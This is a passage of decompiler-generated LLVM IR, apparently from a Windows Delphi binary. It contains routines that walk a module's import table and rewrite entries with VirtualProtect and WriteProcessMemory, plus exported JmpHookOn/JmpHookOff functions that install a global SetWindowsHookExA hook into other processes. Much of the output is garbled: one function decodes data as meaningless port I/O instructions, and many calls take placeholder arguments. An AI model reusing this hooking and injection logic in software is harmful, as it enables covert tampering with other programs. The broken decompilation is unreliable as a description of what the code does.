  %storemerge6.reg2mem = alloca i32, !insn.addr !392
  %.reg2mem14 = alloca i32, !insn.addr !392
  %esp.17.reg2mem = alloca i32, !insn.addr !392
  %esi.08.reg2mem = alloca i32, !insn.addr !392
  %.reg2mem = alloca i32, !insn.addr !392
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !393
  %4 = icmp eq i1 %3, false, !insn.addr !394
  %5 = icmp eq i32 %arg1, 0, !insn.addr !395
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_404c25, label %dec_label_pc_404b9e, !insn.addr !394

dec_label_pc_404b9e:                              ; preds = %dec_label_pc_404b78
  %6 = trunc i32 %2 to i16, !insn.addr !396
  %7 = trunc i32 %1 to i8, !insn.addr !397
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !398
  %8 = inttoptr i32 %0 to i32*, !insn.addr !399
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !399
  %10 = ptrtoint i32* %9 to i32, !insn.addr !399
  %11 = icmp eq i32* %9, null, !insn.addr !400
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !401
  br i1 %11, label %dec_label_pc_404c25, label %dec_label_pc_404c1e.preheader, !insn.addr !401

dec_label_pc_404c1e.preheader:                    ; preds = %dec_label_pc_404b9e
  %12 = add i32 %10, 12, !insn.addr !402
  %13 = inttoptr i32 %12 to i32*, !insn.addr !402
  %14 = load i32, i32* %13, align 4, !insn.addr !402
  %15 = icmp eq i32 %14, 0, !insn.addr !403
  %16 = icmp eq i1 %15, false, !insn.addr !404
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !404
  br i1 %16, label %dec_label_pc_404bb7.lr.ph, label %dec_label_pc_404c25, !insn.addr !404

dec_label_pc_404bb7.lr.ph:                        ; preds = %dec_label_pc_404c1e.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !398
  %sext = mul i32 %1, 16777216
  %18 = sdiv i32 %sext, 16777216, !insn.addr !405
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_404bb7

dec_label_pc_404bb7:                              ; preds = %dec_label_pc_404bb7.lr.ph, %dec_label_pc_404c1b
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !406
  %24 = add i32 %esp.17.reload, -4, !insn.addr !407
  %25 = inttoptr i32 %24 to i32*, !insn.addr !407
  store i32 %18, i32* %25, align 4, !insn.addr !407
  %26 = add i32 %esp.17.reload, -8, !insn.addr !408
  %27 = inttoptr i32 %26 to i32*, !insn.addr !408
  store i32 %23, i32* %27, align 4, !insn.addr !408
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !409
  %29 = icmp eq i32 %28, 0, !insn.addr !410
  %30 = icmp eq i1 %29, false, !insn.addr !411
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !411
  br i1 %30, label %dec_label_pc_404c1b, label %dec_label_pc_404bca, !insn.addr !411

dec_label_pc_404bca:                              ; preds = %dec_label_pc_404bb7
  %31 = add i32 %esi.08.reload, 16, !insn.addr !412
  %32 = inttoptr i32 %31 to i32*, !insn.addr !412
  %33 = load i32, i32* %32, align 4, !insn.addr !412
  %34 = add i32 %33, %arg1, !insn.addr !413
  %35 = inttoptr i32 %34 to i32*, !insn.addr !414
  %36 = load i32, i32* %35, align 4, !insn.addr !414
  %37 = icmp eq i32 %36, 0, !insn.addr !415
  %38 = icmp eq i1 %37, false, !insn.addr !416
  store i32 %36, i32* %.reg2mem14, !insn.addr !416
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !416
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !416
  br i1 %38, label %dec_label_pc_404bd2, label %dec_label_pc_404c1b, !insn.addr !416

dec_label_pc_404bd2:                              ; preds = %dec_label_pc_404bca, %dec_label_pc_404c12
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !417
  %40 = icmp eq i1 %39, false, !insn.addr !418
  br i1 %40, label %dec_label_pc_404c12, label %dec_label_pc_404bd7, !insn.addr !418

dec_label_pc_404bd7:                              ; preds = %dec_label_pc_404bd2
  %41 = add i32 %esp.17.reload, -12, !insn.addr !419
  %42 = inttoptr i32 %41 to i32*, !insn.addr !419
  store i32 %20, i32* %42, align 4, !insn.addr !419
  %43 = add i32 %esp.17.reload, -16, !insn.addr !420
  %44 = inttoptr i32 %43 to i32*, !insn.addr !420
  store i32 128, i32* %44, align 4, !insn.addr !420
  %45 = add i32 %esp.17.reload, -20, !insn.addr !421
  %46 = inttoptr i32 %45 to i32*, !insn.addr !421
  store i32 4, i32* %46, align 4, !insn.addr !421
  %47 = add i32 %esp.17.reload, -24, !insn.addr !422
  %48 = inttoptr i32 %47 to i32*, !insn.addr !422
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !422
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !423
  %50 = add i32 %esp.17.reload, -28, !insn.addr !424
  %51 = inttoptr i32 %50 to i32*, !insn.addr !424
  store i32 %21, i32* %51, align 4, !insn.addr !424
  %52 = add i32 %esp.17.reload, -32, !insn.addr !425
  %53 = inttoptr i32 %52 to i32*, !insn.addr !425
  store i32 4, i32* %53, align 4, !insn.addr !425
  %54 = add i32 %esp.17.reload, -36, !insn.addr !426
  %55 = inttoptr i32 %54 to i32*, !insn.addr !426
  store i32 %22, i32* %55, align 4, !insn.addr !426
  %56 = add i32 %esp.17.reload, -40, !insn.addr !427
  %57 = inttoptr i32 %56 to i32*, !insn.addr !427
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !427
  %58 = call i32* @GetCurrentProcess(), !insn.addr !428
  %59 = ptrtoint i32* %58 to i32, !insn.addr !428
  %60 = add i32 %esp.17.reload, -44, !insn.addr !429
  %61 = inttoptr i32 %60 to i32*, !insn.addr !429
  store i32 %59, i32* %61, align 4, !insn.addr !429
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !430
  %63 = add i32 %esp.17.reload, -48, !insn.addr !431
  %64 = inttoptr i32 %63 to i32*, !insn.addr !431
  store i32 %21, i32* %64, align 4, !insn.addr !431
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !432
  %66 = add i32 %esp.17.reload, -52, !insn.addr !433
  %67 = inttoptr i32 %66 to i32*, !insn.addr !433
  store i32 %65, i32* %67, align 4, !insn.addr !433
  %68 = add i32 %esp.17.reload, -56, !insn.addr !434
  %69 = inttoptr i32 %68 to i32*, !insn.addr !434
  store i32 4, i32* %69, align 4, !insn.addr !434
  %70 = add i32 %esp.17.reload, -60, !insn.addr !435
  %71 = inttoptr i32 %70 to i32*, !insn.addr !435
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !435
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !436
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !437
  br label %dec_label_pc_404c1b, !insn.addr !437

dec_label_pc_404c12:                              ; preds = %dec_label_pc_404bd2
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !438
  %74 = inttoptr i32 %73 to i32*, !insn.addr !414
  %75 = load i32, i32* %74, align 4, !insn.addr !414
  %76 = icmp eq i32 %75, 0, !insn.addr !415
  %77 = icmp eq i1 %76, false, !insn.addr !416
  store i32 %75, i32* %.reg2mem14, !insn.addr !416
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !416
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !416
  br i1 %77, label %dec_label_pc_404bd2, label %dec_label_pc_404c1b, !insn.addr !416

dec_label_pc_404c1b:                              ; preds = %dec_label_pc_404c12, %dec_label_pc_404bca, %dec_label_pc_404bd7, %dec_label_pc_404bb7
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !439
  %79 = add i32 %esi.08.reload, 32, !insn.addr !402
  %80 = inttoptr i32 %79 to i32*, !insn.addr !402
  %81 = load i32, i32* %80, align 4, !insn.addr !402
  %82 = icmp eq i32 %81, 0, !insn.addr !403
  %83 = icmp eq i1 %82, false, !insn.addr !404
  store i32 %81, i32* %.reg2mem, !insn.addr !404
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !404
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !404
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !404
  br i1 %83, label %dec_label_pc_404bb7, label %dec_label_pc_404c25, !insn.addr !404

dec_label_pc_404c25:                              ; preds = %dec_label_pc_404c1b, %dec_label_pc_404c1e.preheader, %dec_label_pc_404b9e, %dec_label_pc_404b78
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !440
}

define i32 @function_404c30(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_404c30:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !441
  %2 = inttoptr i32 %1 to i32*, !insn.addr !441
  %3 = load i32, i32* %2, align 4, !insn.addr !441
  ret i32 %3, !insn.addr !442
}

define i32 @function_404c34() local_unnamed_addr {
dec_label_pc_404c34:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !443
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !443
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !443
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !444
  %2 = load i32, i32* @global_var_409690, align 4, !insn.addr !445
  %3 = add i32 %2, 1, !insn.addr !445
  store i32 %3, i32* @global_var_409690, align 4, !insn.addr !445
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !446
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !447
  ret i32 0, !insn.addr !448
}

define i32 @function_404c59() local_unnamed_addr {
dec_label_pc_404c59:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !449
  ret i32 %0, !insn.addr !449
}

define i32 @function_404c5e() local_unnamed_addr {
dec_label_pc_404c5e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !450
}

define i32 @function_404c60(i32 %arg1) local_unnamed_addr {
dec_label_pc_404c60:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !451
}

define i32 @function_404c64() local_unnamed_addr {
dec_label_pc_404c64:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409690, align 4, !insn.addr !452
  %2 = add i32 %1, -1, !insn.addr !452
  store i32 %2, i32* @global_var_409690, align 4, !insn.addr !452
  ret i32 %0, !insn.addr !453
}

define i32* @function_404c6c(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd) local_unnamed_addr {
dec_label_pc_404c6c:
  %0 = call i32* @ShellExecuteA(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd), !insn.addr !454
  ret i32* %0, !insn.addr !454
}

define i32 @function_404c74() local_unnamed_addr {
dec_label_pc_404c74:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !455
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !455
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !455
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !456
  %2 = load i32, i32* @global_var_409694, align 4, !insn.addr !457
  %3 = add i32 %2, 1, !insn.addr !457
  store i32 %3, i32* @global_var_409694, align 4, !insn.addr !457
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !458
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !459
  ret i32 0, !insn.addr !460
}

define i32 @function_404c99() local_unnamed_addr {
dec_label_pc_404c99:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !461
  ret i32 %0, !insn.addr !461
}

define i32 @function_404c9e() local_unnamed_addr {
dec_label_pc_404c9e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !462
}

define i32 @function_404ca0(i32 %arg1) local_unnamed_addr {
dec_label_pc_404ca0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !463
}

define i32 @function_404ca4() local_unnamed_addr {
dec_label_pc_404ca4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409694, align 4, !insn.addr !464
  %2 = add i32 %1, -1, !insn.addr !464
  store i32 %2, i32* @global_var_409694, align 4, !insn.addr !464
  ret i32 %0, !insn.addr !465
}

define i32 @function_404cac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_404cac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @function_404c30(i32 %1, i32 %2, i32 %0, i32 %arg1, i32 %arg2), !insn.addr !466
  ret i32 %3, !insn.addr !467
}

define i32 @function_404cf8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404cf8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg3, 2975, !insn.addr !468
  %2 = icmp eq i1 %1, false, !insn.addr !469
  %spec.select = select i1 %2, i32 %arg3, i32 2974
  %3 = call i32 @function_404c30(i32 %0, i32 %arg1, i32 %arg2, i32 %spec.select, i32 %arg4), !insn.addr !470
  ret i32 %3, !insn.addr !471
}

define i32 @function_404d28(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_404d28:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !472
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !472
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !472
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !473
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !474
  %3 = call i32 @"@LStrPos"(), !insn.addr !475
  %4 = icmp slt i32 %3, 1
  %spec.select = select i1 %4, i32 %arg4, i32 ptrtoint ([33 x i8]* @global_var_404e00 to i32)
  %5 = call i32 @"@LStrFromPChar"(), !insn.addr !476
  %6 = call i32 @"@LStrPos"(), !insn.addr !477
  %7 = icmp slt i32 %6, 1
  %esi.0 = select i1 %7, i32 %arg3, i32 ptrtoint ([33 x i8]* @global_var_404e00 to i32)
  %8 = call i32 @function_404c30(i32 %arg1, i32 %arg2, i32 %esi.0, i32 %spec.select, i32 %arg5), !insn.addr !478
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !479
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !480
  ret i32 %9, !insn.addr !481
}

define i32 @function_404dc0() local_unnamed_addr {
dec_label_pc_404dc0:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !482
  ret i32 %0, !insn.addr !482
}

define i32 @function_404dc5() local_unnamed_addr {
dec_label_pc_404dc5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !483
}

define i32 @function_404dc7(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_404dc7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !484
}

define i32 @function_404dd7() local_unnamed_addr {
dec_label_pc_404dd7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !485
}

define i32 @function_404e24() local_unnamed_addr {
dec_label_pc_404e24:
  %0 = call i32 @function_404aa4(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_404e94, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_404ea0, i32 0, i32 0), i32 4213932), !insn.addr !486
  store i32 %0, i32* @global_var_4080f8, align 4, !insn.addr !487
  %1 = call i32 @function_404aa4(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_404e94, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_404ebc, i32 0, i32 0), i32 4214008), !insn.addr !488
  store i32 %1, i32* @global_var_4080fc, align 4, !insn.addr !489
  %2 = call i32 @function_404aa4(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_404ed4, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_404ee0, i32 0, i32 0), i32 4214056), !insn.addr !490
  store i32 %2, i32* @global_var_408100, align 4, !insn.addr !491
  ret i32 %2, !insn.addr !492
}

define i32 @function_404e94(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14, i32 %arg15, i32 %arg16) local_unnamed_addr {
dec_label_pc_404e94:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %6 = call i32 @__decompiler_undefined_function_0()
  %7 = call i1 @__decompiler_undefined_function_1()
  %8 = call i1 @__decompiler_undefined_function_1()
  %9 = call i32 @__decompiler_undefined_function_0()
  %10 = icmp eq i1 %7, false, !insn.addr !493
  br i1 %10, label %dec_label_pc_404f09, label %dec_label_pc_404e96, !insn.addr !493

dec_label_pc_404e96:                              ; preds = %dec_label_pc_404e94
  br i1 %8, label %dec_label_pc_404ecc, label %dec_label_pc_404e99, !insn.addr !494

dec_label_pc_404e99:                              ; preds = %dec_label_pc_404e96
  %11 = trunc i32 %4 to i16, !insn.addr !495
  %12 = call i8 @__asm_insb(i16 %11), !insn.addr !495
  %13 = inttoptr i32 %0 to i8*, !insn.addr !495
  store i8 %12, i8* %13, align 1, !insn.addr !495
  %14 = call i8 @__asm_insb(i16 %11), !insn.addr !496
  store i8 %14, i8* %13, align 1, !insn.addr !496
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !497
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !497
  %19 = add i8 %16, %18, !insn.addr !497
  %20 = inttoptr i32 %17 to i8*, !insn.addr !497
  store i8 %19, i8* %20, align 1, !insn.addr !497
  call void @__asm_outsd(i16 %11, i32 %1), !insn.addr !498
  %21 = trunc i32 %arg10 to i16, !insn.addr !499
  %22 = call i32 @__asm_insd(i16 %21), !insn.addr !499
  %23 = inttoptr i32 %9 to i32*, !insn.addr !499
  store i32 %22, i32* %23, align 4, !insn.addr !499
  store i32 %arg1, i32* %eax, align 4, !insn.addr !500
  %24 = inttoptr i32 %arg1 to i8*, !insn.addr !501
  %25 = load i8, i8* %24, align 1, !insn.addr !501
  %26 = trunc i32 %arg1 to i8, !insn.addr !501
  %27 = add i8 %25, %26, !insn.addr !501
  store i8 %27, i8* %24, align 1, !insn.addr !501
  %28 = trunc i32 %arg3 to i16, !insn.addr !502
  %29 = inttoptr i32 %arg6 to i32*, !insn.addr !502
  %30 = load i32, i32* %29, align 4, !insn.addr !502
  call void @__asm_outsd(i16 %28, i32 %30), !insn.addr !502
  %31 = add i32 %arg5, 67, !insn.addr !503
  %32 = and i32 %31, 65535
  %33 = inttoptr i32 %32 to i32*, !insn.addr !503
  %34 = load i32, i32* %33, align 4, !insn.addr !503
  %35 = load i8, i8* %24, align 1, !insn.addr !504
  %36 = add i8 %35, %26, !insn.addr !504
  store i8 %36, i8* %24, align 1, !insn.addr !504
  %37 = mul i32 %34, 1557718248, !insn.addr !505
  %38 = add i32 %arg7, 97, !insn.addr !505
  %39 = add i32 %38, %37, !insn.addr !505
  %40 = inttoptr i32 %39 to i8*, !insn.addr !505
  %41 = load i8, i8* %40, align 1, !insn.addr !505
  %42 = trunc i32 %arg2 to i8
  %43 = add i8 %42, 1, !insn.addr !505
  %44 = add i8 %43, %41, !insn.addr !505
  %45 = icmp eq i8 %44, 0, !insn.addr !505
  store i8 %44, i8* %40, align 1, !insn.addr !505
  br i1 %45, label %dec_label_pc_404f35, label %dec_label_pc_404ec3, !insn.addr !506

dec_label_pc_404ec3:                              ; preds = %dec_label_pc_404e99
  %46 = load i32, i32* %eax, align 4, !insn.addr !507
  ret i32 %46, !insn.addr !507

dec_label_pc_404ecc:                              ; preds = %dec_label_pc_404e96
  %47 = trunc i32 %6 to i8
  %48 = mul i32 %1, 256
  %49 = and i32 %48, 65280
  %50 = xor i32 %5, %49, !insn.addr !508
  %51 = bitcast i32* %eax to i8*
  %52 = mul i8 %47, 2, !insn.addr !509
  %53 = inttoptr i32 %6 to i8*, !insn.addr !509
  store i8 %52, i8* %53, align 1, !insn.addr !509
  %54 = add i32 %3, 104, !insn.addr !510
  %55 = inttoptr i32 %54 to i8*, !insn.addr !510
  %56 = load i8, i8* %55, align 1, !insn.addr !510
  %57 = udiv i32 %4, 256, !insn.addr !510
  %58 = trunc i32 %57 to i8, !insn.addr !510
  %59 = add i8 %56, %58, !insn.addr !510
  store i8 %59, i8* %55, align 1, !insn.addr !510
  %60 = trunc i32 %4 to i16, !insn.addr !511
  %61 = call i8 @__asm_insb(i16 %60), !insn.addr !511
  %62 = inttoptr i32 %0 to i8*, !insn.addr !511
  store i8 %61, i8* %62, align 1, !insn.addr !511
  %63 = call i8 @__asm_insb(i16 %60), !insn.addr !512
  store i8 %63, i8* %62, align 1, !insn.addr !512
  %64 = xor i32 %4, %1, !insn.addr !513
  %65 = call i8 @__asm_insb(i16 %60), !insn.addr !514
  store i8 %65, i8* %62, align 1, !insn.addr !514
  %66 = call i8 @__asm_insb(i16 %60), !insn.addr !515
  store i8 %66, i8* %62, align 1, !insn.addr !515
  %67 = load i8, i8* %55, align 1, !insn.addr !516
  %68 = trunc i32 %4 to i8, !insn.addr !516
  %69 = add i8 %67, %68, !insn.addr !516
  store i8 %69, i8* %55, align 1, !insn.addr !516
  %70 = call i8 @__asm_insb(i16 %60), !insn.addr !517
  store i8 %70, i8* %62, align 1, !insn.addr !517
  %71 = call i8 @__asm_insb(i16 %60), !insn.addr !518
  store i8 %71, i8* %62, align 1, !insn.addr !518
  %72 = add i32 %2, 117, !insn.addr !519
  %73 = inttoptr i32 %72 to i16*, !insn.addr !519
  %74 = load i16, i16* %73, align 2, !insn.addr !519
  %75 = trunc i32 %64 to i16, !insn.addr !519
  call void @__asm_arpl(i16 %74, i16 %75), !insn.addr !519
  %76 = load i8, i8* %51, align 4, !insn.addr !520
  %77 = load i32, i32* %eax, align 4
  %78 = trunc i32 %77 to i8, !insn.addr !520
  %79 = add i8 %76, %78, !insn.addr !520
  %80 = inttoptr i32 %77 to i8*, !insn.addr !520
  store i8 %79, i8* %80, align 1, !insn.addr !520
  %81 = add i32 %50, 82, !insn.addr !521
  %82 = inttoptr i32 %81 to i8*, !insn.addr !521
  %83 = load i8, i8* %82, align 1, !insn.addr !521
  %84 = add i8 %83, %68, !insn.addr !521
  store i8 %84, i8* %82, align 1, !insn.addr !521
  %85 = load i32, i32* %eax, align 4, !insn.addr !522
  %86 = add i32 %85, -1, !insn.addr !522
  %87 = add i32 %50, 4227321, !insn.addr !523
  %88 = inttoptr i32 %87 to i8*, !insn.addr !523
  %89 = load i8, i8* %88, align 1, !insn.addr !523
  %90 = udiv i32 %86, 256, !insn.addr !523
  %91 = trunc i32 %90 to i8, !insn.addr !523
  %92 = add i8 %89, %91, !insn.addr !523
  store i8 %92, i8* %88, align 1, !insn.addr !523
  ret i32 %86, !insn.addr !523

dec_label_pc_404f09:                              ; preds = %dec_label_pc_404e94
  ret i32 %6, !insn.addr !524

dec_label_pc_404f35:                              ; preds = %dec_label_pc_404e99
  %93 = call i32 @CallNextHookEx(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !525
  ret i32 %93, !insn.addr !526
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_404f40:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4214560 to i32*), i32 3), !insn.addr !527
  %2 = ptrtoint i32* %1 to i32, !insn.addr !527
  store i32 %2, i32* @global_var_40969c, align 4, !insn.addr !528
  %3 = icmp eq i32* %1, null, !insn.addr !529
  %4 = icmp eq i1 %3, false, !insn.addr !530
  %5 = sext i1 %4 to i32, !insn.addr !531
  ret i32 %5, !insn.addr !532
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_404f6c:
  %0 = load i32, i32* @global_var_40969c, align 4, !insn.addr !533
  %1 = inttoptr i32 %0 to i32*, !insn.addr !534
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !534
  %3 = sext i1 %2 to i32, !insn.addr !534
  ret i32 %3, !insn.addr !535
}

define i32 @function_404f78() local_unnamed_addr {
dec_label_pc_404f78:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !536
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !536
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !536
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !537
  %2 = load i32, i32* @global_var_409698, align 4, !insn.addr !538
  %3 = add i32 %2, 1, !insn.addr !538
  store i32 %3, i32* @global_var_409698, align 4, !insn.addr !538
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !539
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !540
  ret i32 0, !insn.addr !541
}

define i32 @function_404f9d() local_unnamed_addr {
dec_label_pc_404f9d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !542
  ret i32 %0, !insn.addr !542
}

define i32 @function_404fa2() local_unnamed_addr {
dec_label_pc_404fa2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !543
}

define i32 @function_404fa4(i32 %arg1) local_unnamed_addr {
dec_label_pc_404fa4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !544
}

define i32 @function_404fa8() local_unnamed_addr {
dec_label_pc_404fa8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409698, align 4, !insn.addr !545
  %2 = add i32 %1, -1, !insn.addr !545
  store i32 %2, i32* @global_var_409698, align 4, !insn.addr !545
  ret i32 %0, !insn.addr !546
}

define i32 @function_404fb0() local_unnamed_addr {
dec_label_pc_404fb0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !547
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !547
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !547
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !548
  %2 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !549
  %3 = add i32 %2, 1, !insn.addr !549
  store i32 %3, i32* @global_var_4096a0, align 4, !insn.addr !549
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !550
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !551
  ret i32 0, !insn.addr !552
}

define i32 @function_404fd5() local_unnamed_addr {
dec_label_pc_404fd5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !553
  ret i32 %0, !insn.addr !553
}

define i32 @function_404fda() local_unnamed_addr {
dec_label_pc_404fda:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !554
}

define i32 @function_404fdc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404fdc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !555
}

define i32 @function_404fe0() local_unnamed_addr {
dec_label_pc_404fe0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !556
  %2 = add i32 %1, -1, !insn.addr !556
  store i32 %2, i32* @global_var_4096a0, align 4, !insn.addr !556
  ret i32 %0, !insn.addr !557
}

define i32 @function_404fe8() local_unnamed_addr {
